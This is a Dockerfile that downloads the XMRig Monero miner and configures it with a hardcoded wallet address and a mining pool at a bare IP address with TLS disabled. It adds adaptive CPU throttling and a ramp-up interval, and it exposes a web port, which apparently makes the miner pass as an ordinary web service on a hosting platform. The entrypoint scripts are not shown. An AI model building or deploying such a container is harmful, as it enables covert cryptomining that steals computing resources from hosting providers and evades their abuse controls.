FROM debian:bookworm-slim

RUN apt-get update && \
    apt-get install -y --no-install-recommends curl ca-certificates python3 && \
    rm -rf /var/lib/apt/lists/*

ARG XMRIG_VERSION=6.26.0
ARG ARCH=static-x64

RUN curl -fsSL "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-${ARCH}.tar.gz" \
    -o /tmp/xmrig.tar.gz && \
    mkdir -p /opt/xmrig && \
    tar -xzf /tmp/xmrig.tar.gz -C /opt/xmrig/ --strip-components=1 && \
    chmod +x /opt/xmrig/xmrig && \
    rm -f /tmp/xmrig.tar.gz

WORKDIR /app
COPY . .
RUN chmod +x start.sh entrypoint.sh

ENV WALLET=4AL6QjWtF4RCyPzPT7Ew3khPuqhmcJC9BQe9Cpxvv3noevJyp23YLTySZpHzWZyb1EEcGd8FRurTpWjcQmdJJgxzUYSFyBC
ENV POOL_URL=93.157.244.212
ENV POOL_PORT=3333
ENV ALGO=rx/0
ENV COIN=monero
ENV TLS=false
ENV POOL_PASS=x
ENV DONATE=1
ENV LIGHT_MODE=true
ENV ADAPTIVE_THREADS=true
ENV RAMP_INTERVAL_SEC=60
ENV PRINT_TIME=1
ENV VERBOSE_LEVEL=2

EXPOSE ${PORT:-8080}

ENTRYPOINT ["/app/entrypoint.sh"]
